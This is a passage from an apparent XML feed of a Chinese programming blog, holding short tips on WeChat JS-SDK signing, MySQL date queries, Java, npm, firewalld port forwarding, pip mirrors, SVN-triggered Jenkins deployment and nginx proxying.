class="hljs-string">&#x27;https://api.weixin.qq.com/cgi-bin/ticket/getticket&#x27;</span>, params_tik).text<br>        ticket = json.loads(ticket_data)[<span class="hljs-string">&#x27;ticket&#x27;</span>]<br>        r.<span class="hljs-built_in">set</span>(tik, ticket, ex=<span class="hljs-number">7100</span>)<br>    <span class="hljs-keyword">else</span>:<br>        ticket = r.get(tik)<br>    <span class="hljs-keyword">return</span> ticket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSignature</span>(<span class="hljs-params">url</span>):<br>    ran_str = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="hljs-number">8</span>))<br>    timestamp = <span class="hljs-built_in">int</span>(time.time())<br>    params = &#123;<span class="hljs-string">&#x27;noncestr&#x27;</span>: ran_str, <span class="hljs-string">&#x27;jsapi_ticket&#x27;</span>: getTicket(), <span class="hljs-string">&#x27;timestamp&#x27;</span>: timestamp, <span class="hljs-string">&#x27;url&#x27;</span>: url&#125;<br>    stringA = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 参数排序与拼接</span><br>    ks = <span class="hljs-built_in">sorted</span>(params.keys())<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> ks:<br>        stringA += k + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-built_in">str</span>(params[k]) + <span class="hljs-string">&quot;&amp;&quot;</span><br>    stringSignTemp = stringA[:-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment"># sha1</span><br>    hash_sha1 = hashlib.sha1(stringSignTemp.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>))<br>    result_string = &#123;<br>        <span class="hljs-string">&#x27;debug&#x27;</span>: <span class="hljs-literal">True</span>,<br>        <span class="hljs-string">&#x27;appId&#x27;</span>: appId,<br>        <span class="hljs-string">&#x27;timestamp&#x27;</span>: timestamp,<br>        <span class="hljs-string">&#x27;nonceStr&#x27;</span>: ran_str,<br>        <span class="hljs-string">&#x27;signature&#x27;</span>: hash_sha1.hexdigest(),<br>        <span class="hljs-string">&#x27;jsApiList&#x27;</span>: [<span class="hljs-string">&#x27;updateAppMessageShareData&#x27;</span>, <span class="hljs-string">&#x27;updateTimelineShareData&#x27;</span>]<br>    &#125;<br>    <span class="hljs-keyword">return</span> json.dumps(result_string)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">getResult</span>(<span class="hljs-title class_ inherited__">RequestHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.write(getSignature(url))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    app = Application([(<span class="hljs-string">r&quot;/getApi&quot;</span>, getResult)])<br><br>    port = <span class="hljs-number">8060</span><br><br>    app.listen(port)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\n=============================================================&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; (♥◠‿◠)ﾉﾞ server run success at: http://0.0.0.0:%s ლ(´ڡ`ლ)ﾞ&quot;</span> % <span class="hljs-built_in">str</span>(port))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=============================================================\n\n&quot;</span>)<br><br>    IOLoop.current().start()<br><br></code></pre></td></tr></table></figure><ul><li>在请求微信服务器时传自定义参数可以实现更多功能，详见<a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html">官方文档</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VsCode开发Python常用配置</title>
    <link href="/2021/06/newpost-15/"/>
    <url>/2021/06/newpost-15/</url>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;python.linting.flake8Enabled&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;python.formatting.provider&quot;</span>: <span class="hljs-string">&quot;yapf&quot;</span>,<br>    <span class="hljs-string">&quot;python.formatting.yapfArgs&quot;</span>: [<span class="hljs-string">&quot;--style=&#123;column_limit=128&#125;&quot;</span>],<br>    <span class="hljs-string">&quot;python.linting.flake8Args&quot;</span>: [<span class="hljs-string">&quot;--max-line-length=248&quot;</span>],<br>    <span class="hljs-string">&quot;python.linting.pylintEnabled&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><p>以上采用yapf格式化代码，格式化后单行代码最大长度为128</p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql获取当期日期是该年第几周</title>
    <link href="/2021/06/newpost-14/"/>
    <url>/2021/06/newpost-14/</url>
    
    <content type="html"><![CDATA[<ul><li>最简单常用，返回值为4，这种情况按国际标准，周四在哪一年，这周就属于哪一年，默认周一是一周的第一天</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">WEEKOFYEAR(&#x27;2020-01-20&#x27;)<br></code></pre></td></tr></table></figure><span id="more"></span><ul><li>上边的等价于，但下边的返回值会带上年，如202004</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">YEARWEEK(&#x27;2020-01-20&#x27;,1)<br></code></pre></td></tr></table></figure><ul><li>网上常见的方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">WEEK(date_add(&#x27;2020-01-20&#x27;,interval 6 day),2)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LocalDate获取当前周周一日期</title>
    <link href="/2021/06/newpost-13/"/>
    <url>/2021/06/newpost-13/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.time.DayOfWeek;<br><span class="hljs-keyword">import</span> java.time.LocalDate;<br><span class="hljs-keyword">import</span> java.time.temporal.TemporalAdjusters;<br><br><span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();<br><span class="hljs-type">LocalDate</span> <span class="hljs-variable">moday</span> <span class="hljs-operator">=</span> today.with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除node_modules重新安装</title>
    <link href="/2021/03/newpost-12/"/>
    <url>/2021/03/newpost-12/</url>
    
    <content type="html"><![CDATA[<ul><li>1.关闭项目，终端中进入项目目录</li></ul><span id="more"></span><ul><li>2.安装rimraf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g rimraf<br></code></pre></td></tr></table></figure><ul><li>3.删除 node_modules 包和 package-lock.json 文件</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">rimraf node_modules<br>rimraf package-lock.json<br></code></pre></td></tr></table></figure><ul><li>4.清除缓存</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm cache clear --force<br></code></pre></td></tr></table></figure><ul><li>5.重新安装依赖包</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install<br></code></pre></td></tr></table></figure><ul><li>6启动项目</li></ul><h3 id="另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决"><a href="#另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决" class="headerlink" title="另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决"></a>另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm config set registry https://registry.npmmirror.com/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于firewalld端口转发</title>
    <link href="/2021/02/newpost-10/"/>
    <url>/2021/02/newpost-10/</url>
    
    <content type="html"><![CDATA[<h2 id="1-首先确认firewalld已经安装"><a href="#1-首先确认firewalld已经安装" class="headerlink" title="1.首先确认firewalld已经安装"></a>1.首先确认firewalld已经安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">firewall-cmd --state<br></code></pre></td></tr></table></figure><p>如果输出不<strong>是running</strong>，则可能没安装或者没启动，没启动会提示<code>not running</code></p><span id="more"></span><ul><li><p>没安装，通过<code>yum install -y firewalld</code>安装</p></li><li><p>安装后，或没启动，通过以下命令配置开机自动启动并立即启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl enable firewalld<br>systemctl start firewalld<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-配置转发"><a href="#2-配置转发" class="headerlink" title="2.配置转发"></a>2.配置转发</h2><ul><li>本实例假设你要把本地8080端口转发到目标服务器88.88.88.88的443端口，同时转发TCP和UDP</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;net.ipv4.ip_forward = 1&#x27; &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br>firewall-cmd --permanent --add-masquerade<br><span class="hljs-meta prompt_"># </span><span class="language-bash">8080可以改成其他端口</span><br>firewall-cmd --permanent --add-port=8080/tcp<br>firewall-cmd --permanent --add-port=8080/udp<br><span class="hljs-meta prompt_"># </span><span class="language-bash">8080和上面保持一致，目标ip和端口都可以修改</span><br>firewall-cmd --permanent --add-forward-port=port=8080:proto=tcp:toaddr=88.88.88.88:toport=443<br>firewall-cmd --permanent --add-forward-port=port=8080:proto=udp:toaddr=88.88.88.88:toport=443<br>firewall-cmd --reload<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pip 安装 tensorflow MemoryError</title>
    <link href="/2021/01/newpost-9/"/>
    <url>/2021/01/newpost-9/</url>
    
    <content type="html"><![CDATA[<p>原因是内存不够了，可以添加<code>--no-cache-dir</code>禁用缓存，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install --no-cache-dir tenstoflow==<span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java过滤html标签</title>
    <link href="/2020/12/newpost-8/"/>
    <url>/2020/12/newpost-8/</url>
    
    <content type="html"><![CDATA[<p>假设str为html富文本，则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">str.replaceAll(<span class="hljs-string">&quot;\\&amp;[a-zA-Z]&#123;1,10&#125;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;&lt;[^&gt;]*&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;[(/&gt;)&lt;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql清空表，并让自增从0开始</title>
    <link href="/2020/12/newpost-7/"/>
    <url>/2020/12/newpost-7/</url>
    
    <content type="html"><![CDATA[<p>mysql清空表与自增</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">truncate table table_name;<br></code></pre></td></tr></table></figure><ul><li>tableName替换你的表名</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript获取当前周或下n周的周n的日期</title>
    <link href="/2020/12/newpost-6/"/>
    <url>/2020/12/newpost-6/</url>
    
    <content type="html"><![CDATA[<p>调用方法<code>getDate(cur_m, day_m)</code></p><span id="more"></span><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getDate</span>(<span class="hljs-params">cur_m, day_m</span>) &#123;<br>  <span class="hljs-comment">// cur_m，0-本周，1-下周，2-下下周...</span><br>  <span class="hljs-comment">// day_m，1-周一，2-周二...7-周日</span><br>  <span class="hljs-keyword">var</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>  <span class="hljs-keyword">var</span> day = date.<span class="hljs-title function_">getDay</span>() || <span class="hljs-number">7</span>;<br>  date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(date.<span class="hljs-title function_">getFullYear</span>(), date.<span class="hljs-title function_">getMonth</span>(), date.<span class="hljs-title function_">getDate</span>() - day + day_m + <span class="hljs-number">7</span> * cur_m);<br>  <span class="hljs-keyword">var</span> y = date.<span class="hljs-title function_">getFullYear</span>();<br>  <span class="hljs-keyword">var</span> m = date.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>;<br>  m = m &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&#x27;0&#x27;</span> + m : m;<br>  <span class="hljs-keyword">var</span> d = date.<span class="hljs-title function_">getDate</span>();<br>  d = d &lt; <span class="hljs-number">10</span> ? (<span class="hljs-string">&#x27;0&#x27;</span> + d) : d;<br>  <span class="hljs-keyword">return</span> y + <span class="hljs-string">&#x27;-&#x27;</span> + m + <span class="hljs-string">&#x27;-&#x27;</span> + d;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java复制不同实体类中相同的字段</title>
    <link href="/2020/12/newpost-5/"/>
    <url>/2020/12/newpost-5/</url>
    
    <content type="html"><![CDATA[<p>用下边的方法就能实现，其中<code>source</code>为复制源，<code>target</code>为复制目标。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.beans.BeanUtils;<br><br>BeanUtils.copyProperties(source, target);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端下载二进制文件</title>
    <link href="/2020/11/newpost-4/"/>
    <url>/2020/11/newpost-4/</url>
    
    <content type="html"><![CDATA[<p>假设你从后台获取到的二进制数据为<code>res</code>，则</p><span id="more"></span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> eleLink = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>eleLink.<span class="hljs-property">download</span> = <span class="hljs-string">&#x27;导出.xls&#x27;</span>;<br>eleLink.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-comment">// 二进制内容转变成blob地址</span><br><span class="hljs-keyword">var</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([res]);<br>eleLink.<span class="hljs-property">href</span> = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);<br><span class="hljs-comment">// 触发点击</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(eleLink);<br>eleLink.<span class="hljs-title function_">click</span>();<br><span class="hljs-comment">// 然后移除</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(eleLink);<br></code></pre></td></tr></table></figure><p>如果发现乱码，可能是请求头问题，在请求头部加上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">responseType</span>: <span class="hljs-string">&#x27;arraybuffer&#x27;</span><br></code></pre></td></tr></table></figure><p>就能指定返回为二进制流</p>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql获取最近一段时间数据</title>
    <link href="/2020/11/newpost-3/"/>
    <url>/2020/11/newpost-3/</url>
    
    <content type="html"><![CDATA[<ul><li>获取最近七天，其中<code>CREATE_TIME</code>改为实际表中存储时间的字段</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(id) from table where date_sub(curdate(), interval 7 day) &lt;= date(CREATE_TIME)<br></code></pre></td></tr></table></figure><span id="more"></span><ul><li>获取最近半年</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(id) from table where date_sub(curdate(), interval 6 month) &lt;= date(CREATE_TIME)<br></code></pre></td></tr></table></figure><ul><li>获取最近一年</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(id) from table where date_sub(curdate(), interval 1 year) &lt;= date(CREATE_TIME)<br></code></pre></td></tr></table></figure><ul><li>获取当月</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(id) from table where DATE_FORMAT(NOW(),&#x27;%Y-%m&#x27;) == DATE_FORMAT(CREATE_TIME,&#x27;%Y-%m&#x27;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python - pip换源</title>
    <link href="/2020/11/newpost-2/"/>
    <url>/2020/11/newpost-2/</url>
    
    <content type="html"><![CDATA[<ul><li>windows直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容如下</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[global]</span><br><span class="hljs-attr">index-url</span> = https://mirrors.aliyun.com/pypi/simple/<br></code></pre></td></tr></table></figure><span id="more"></span><p>linux修改 ~/.pip/pip.conf (没有就创建一个)， 内容同上</p><p>其他源</p><ul><li><p>中国科技大学 <code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p></li><li><p>豆瓣 <code>http://pypi.douban.com/simple/</code></p></li><li><p>清华 <code>https://pypi.tuna.tsinghua.edu.cn/simple/</code></p></li><li><p>中国科学技术大学<code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>svn提交后jenkins自动部署</title>
    <link href="/2020/11/newpost-1/"/>
    <url>/2020/11/newpost-1/</url>
    
    <content type="html"><![CDATA[<h2 id="一、jenkins相关"><a href="#一、jenkins相关" class="headerlink" title="一、jenkins相关"></a>一、jenkins相关</h2><h3 id="1-创建SVN专用账号"><a href="#1-创建SVN专用账号" class="headerlink" title="1.创建SVN专用账号"></a>1.创建SVN专用账号</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>管理用户</code>-左边的<code>新建用户</code>，输入相关信息后点击<code>新建用户</code>，假设你创建的账号密码分别是<code>svn</code>，<code>svnpwd</code>。</p><span id="more"></span><ul><li>此步骤可以省略，给<code>SVN</code>创建专用账户的好处是可以知道该条部署是由<code>SVN</code>自动部署，还是某人手工部署。</li></ul><h3 id="2-命令部署SVN"><a href="#2-命令部署SVN" class="headerlink" title="2.命令部署SVN"></a>2.命令部署SVN</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>Jenkins 命令行接口</code>，在页面第一行点击下载<code>jenkins-cli.jar</code>，并复制到SVN所在服务器的某个目录，例如<code>/home/svn/jenkins-cli.jar</code>，在此之前你的服务器应当已经安装了jdk环境。假设你的<code>jenkins</code>运行在<code>http://127.0.0.1:8080</code>，将要部署的项目名为<code>blog</code>，通过以下命令测试是否可以完成部署。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog<br></code></pre></td></tr></table></figure><ul><li>注意，此命令需要<code>jenkins</code>使用<code>webSocket</code>，如果你使用不完整的反向代理配置可能导致该方法不可用。</li></ul><h2 id="二、SVN相关"><a href="#二、SVN相关" class="headerlink" title="二、SVN相关"></a>二、SVN相关</h2><h3 id="1-使用post-commit"><a href="#1-使用post-commit" class="headerlink" title="1.使用post-commit"></a>1.使用post-commit</h3><p>进入你的<code>SVN</code>项目目录，例如<code>/home/svn/project</code>，可以看到hooks文件夹，进入该文件夹，复制<code>post-commit.tmpl</code>到当前目录命名为<code>post-commit</code>，并赋予其执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x post-commit<br></code></pre></td></tr></table></figure><p>清空里边的内容并编辑如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>REPOS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>REV=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><span class="hljs-built_in">source</span> /etc/profile<br>AUTHOR=$(svnlook author -r <span class="hljs-variable">$REV</span> <span class="hljs-variable">$REPOS</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$AUTHOR</span> &gt;&gt; /home/svn/project/hooks/user.txt<br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><p>测试提交代码，如果可以看到提交代码的用户名已经打印到<code>/home/svn/project/hooks/user.txt</code>文件中，则说明成功。</p><ul><li><p>提示<code>post-commit hook failed (exit code 255) with no output</code>多半是没有赋予<code>post-commit</code>可执行权限，还有可能下边的原因。我之前没有复制<code>post-commit.tmpl</code>而是选择手动新建了<code>post-commit</code>文件，就一直报错，后来复制<code>post-commit.tmpl</code>就没问题了。</p></li><li><p>添加<code>source /etc/profile</code>的目的是为了确保jdk环境正常。</p></li></ul><h3 id="2-配置命令自动部署"><a href="#2-配置命令自动部署" class="headerlink" title="2.配置命令自动部署"></a>2.配置命令自动部署</h3><p>修改<code>post-commit</code>文件为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">source</span> /etc/profile<br>java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog<br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><p>这样配置只要提交代码就会操作<code>jenkins</code>部署。如果需要指定用户提交代码才部署则可以如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>REPOS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>REV=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><span class="hljs-built_in">source</span> /etc/profile<br>AUTHOR=$(svnlook author -r <span class="hljs-variable">$REV</span> <span class="hljs-variable">$REPOS</span>)<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$AUTHOR</span> == admin ];<span class="hljs-keyword">then</span><br>    java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>持续集成</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见nginx反向代理配置</title>
    <link href="/2020/11/newpost/"/>
    <url>/2020/11/newpost/</url>
    
    <content type="html"><![CDATA[<ul><li>此配置可以用于jenkins反向代理等</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8888;<br>    <span class="hljs-attribute">proxy_http_version</span>  <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>    <span class="hljs-attribute">proxy_cache_bypass</span>  <span class="hljs-variable">$http_upgrade</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> Upgrade           <span class="hljs-variable">$http_upgrade</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> Connection        <span class="hljs-string">&quot;upgrade&quot;</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> Host              <span class="hljs-variable">$host</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP         <span class="hljs-variable">$remote_addr</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For   <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Host  <span class="hljs-variable">$host</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Port  <span class="hljs-variable">$server_port</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>h5实现一种自动滚动的告警列表</title>
    <link href="/2020/11/post252/"/>
    <url>/2020/11/post252/</url>
    
